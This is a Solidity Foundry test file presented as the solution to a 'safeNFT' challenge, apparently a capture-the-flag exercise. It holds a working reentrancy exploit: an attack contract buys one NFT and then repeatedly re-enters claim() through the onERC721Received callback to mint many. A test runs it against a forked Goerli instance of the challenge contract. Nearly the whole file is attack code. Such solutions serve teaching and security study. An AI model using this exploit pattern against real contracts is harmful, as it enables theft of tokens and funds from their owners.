// SPDX-License-Identifier: None
pragma solidity 0.8.7;

import { Test } from "forge-std/Test.sol";
import { IERC721Receiver } from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import { safeNFT } from "../src/safeNFT.sol";

/**
 * @title   Answer to the safeNFT Challenge
 * @notice  Claim multiple NFT after buying only one, using a well known reentrancy attack
 *          generated by the unsafe use of _safeMint and the onERC721Received callback.
 * @dev     This can be optimised gas-wise 
 * @author  DrGorilla.eth
 */
contract AttackContract {
    constructor() payable{}

    function attack(safeNFT _target) external {
        // Buy one NFT
        _target.buyNFT{value: 0.01 ether}();

        // Claim
        _target.claim();
    }

    function onERC721Received(address sender, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        // If there is enough gas left, continue reentering
        if(gasleft() > 1000000)
            // Do not pass all the gas left, so we can exit gracefully
            safeNFT(msg.sender).claim{gas: gasleft() - 1000000}();

        // Avoid reverting when coming back from the callback
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract SafeNFTTest is Test {
    safeNFT _contract;

    function setUp() public {
        // Fork Goerli, to use the correct instance
        vm.createSelectFork('https://rpc.ankr.com/eth_goerli');
        _contract = safeNFT(0xf0337Cde99638F8087c670c80a57d470134C3AAE);
    }

    function testReentrancy_shouldMintALot() public {
        // Deploy the attack contract
        AttackContract _attack = new AttackContract{value: 0.01 ether}();

        // Get the balance of the attack contract before the attack (ie 0)
        uint256 _nftBalanceBefore = _contract.balanceOf(address(_attack));

        // Attack, pass a maximum amount of gas
        _attack.attack{gas: 10_000_000}(_contract);

        // Check: Mint more than 1 NFT?
        assertGt(_contract.balanceOf(address(_attack)), _nftBalanceBefore + 1);
    }
}